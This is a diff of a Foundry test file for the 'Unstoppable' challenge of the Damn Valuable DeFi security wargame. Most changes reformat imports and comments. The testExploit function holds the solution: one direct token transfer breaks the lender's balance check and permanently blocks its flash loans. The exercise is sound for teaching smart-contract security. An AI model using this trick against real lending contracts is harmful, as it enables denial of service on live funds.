@@ -5,11 +5,13 @@ import {Utilities} from "../../utils/Utilities.sol";
 import "forge-std/Test.sol";
 
 import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
-import {UnstoppableLender} from "../../../src/Contracts/unstoppable/UnstoppableLender.sol";
-import {ReceiverUnstoppable} from "../../../src/Contracts/unstoppable/ReceiverUnstoppable.sol";
+import {UnstoppableLender} from
+    "../../../src/Contracts/unstoppable/UnstoppableLender.sol";
+import {ReceiverUnstoppable} from
+    "../../../src/Contracts/unstoppable/ReceiverUnstoppable.sol";
 
 contract Unstoppable is Test {
-    uint256 internal constant TOKENS_IN_POOL = 1_000_000e18;
+    uint256 internal constant TOKENS_IN_POOL = 1000000e18;
     uint256 internal constant INITIAL_ATTACKER_TOKEN_BALANCE = 100e18;
 
     Utilities internal utils;
@@ -20,7 +22,9 @@ contract Unstoppable is Test {
     address payable internal someUser;
 
     function setUp() public {
-        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
+        /**
+         * SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE
+         */
 
         utils = new Utilities();
         address payable[] memory users = utils.createUsers(2);
@@ -55,14 +59,18 @@ contract Unstoppable is Test {
     }
 
     function testExploit() public {
-        /** EXPLOIT START **/
-        
+        /**
+         * EXPLOIT START *
+         */
+
         vm.prank(attacker);
         // forces a token push to pool which doesn't update `poolBalance`, causing poolBalance != dvt.balanceOf(pool) to always be true
         // leading to dos.
         dvt.transfer(address(unstoppableLender), 1);
-        
-        /** EXPLOIT END **/
+
+        /**
+         * EXPLOIT END *
+         */
         vm.expectRevert(UnstoppableLender.AssertionViolated.selector);
         validation();
     }
